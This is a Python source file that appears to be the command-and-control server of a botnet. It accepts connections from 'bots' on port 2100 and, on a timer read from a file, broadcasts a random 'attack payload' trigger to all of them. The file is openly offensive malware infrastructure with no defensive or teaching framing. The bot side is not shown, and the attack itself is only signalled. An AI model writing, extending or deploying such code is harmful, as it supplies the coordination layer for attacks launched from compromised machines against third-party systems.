import socket
import time
import _thread as thread
from secrets import token_bytes

listen_port = 2100
randomattackpayload = token_bytes(14)  
attack_interval = 5

bots = []

def updateinterval():
    global attack_interval
    f = open("interval.txt","r")
    try:
        attack_interval = int(f.read())
    except:
        attack_interval = 5
    f.close()

updateinterval()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(("0.0.0.0", listen_port))
s.listen(5)
print("[cnc] started at {}:{}".format("0.0.0.0", listen_port))
print("[cnc] will use random attack payload '{}'".format(randomattackpayload))
print("[cnc] will use attack interval of {}s".format(attack_interval))

def attack():
    for bot in bots:
        try:
            bot.send(randomattackpayload)
        except socket.error:
            # client has disconnected
            bots.remove(bot)
            print("[cnc] bot disconnected, attack interval:{}s total bots: {}".format(attack_interval, len(bots)))

    updateinterval()

def runner():
    while True:
        attack()
        time.sleep(attack_interval)

try:
    thread.start_new_thread(runner,())
    print('[cnc] runner thread started')
except:
    print("error launching thread")



while True:
    connection, address = s.accept()
    bots.append(connection)
    print("bot added {}:{}, attack interval:{}s total bots:{}".format(address[0], address[1], attack_interval, len(bots)))